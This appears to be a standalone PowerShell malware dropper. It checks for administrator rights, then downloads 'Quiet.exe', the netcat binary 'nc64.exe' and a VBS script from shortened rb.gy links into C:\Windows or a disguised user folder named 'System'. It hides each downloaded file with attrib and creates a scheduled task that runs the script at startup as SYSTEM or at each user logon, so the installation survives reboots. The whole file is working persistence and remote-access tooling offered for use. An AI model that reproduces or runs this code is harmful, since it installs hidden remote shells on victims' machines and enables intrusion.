# Check if running as admin
$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Determine installation path
$installPath = $isAdmin ? "C:\Windows" : (Join-Path $env:USERPROFILE "System")

# Create directory if not exists
if (-not (Test-Path $installPath)) {
    New-Item -ItemType Directory -Path $installPath -Force | Out-Null
}

# Download files
$files = @{
    "Quiet.exe" = "https://rb.gy/mx0i5"
    "nc64.exe" = "https://rb.gy/guty9"
    "script.vbs" = $isAdmin ? "https://rb.gy/w3a7hb" : "https://rb.gy/3lld2p"
}

foreach ($fileName in $files.Keys) {
    $filePath = Join-Path $installPath $fileName
    try {
        Invoke-WebRequest -Uri $files[$fileName] -OutFile $filePath -ErrorAction Stop
        attrib +H $filePath
    } catch {
        Write-Output "Failed to download $fileName"
    }
}

# Prepare task details
$taskName = "RunScriptVBS-$($env:USERNAME -replace '\s+')"
$scriptVbsPath = Join-Path $installPath "script.vbs"

# Create scheduled task command
$taskArgs = @(
    "/create",
    "/tn", $taskName,
    "/tr", "wscript.exe ""$scriptVbsPath""",
    "/sc", ($isAdmin ? "onstart" : "onlogon"),
    "/ru", ($isAdmin ? "SYSTEM" : $env:USERNAME),
    "/f"
)

# Execute scheduled task creation
$process = Start-Process schtasks -ArgumentList $taskArgs -PassThru -Wait
if ($process.ExitCode -eq 0) {
    Write-Output "Scheduled task created successfully"
} else {
    Write-Output "Failed to create scheduled task"
}
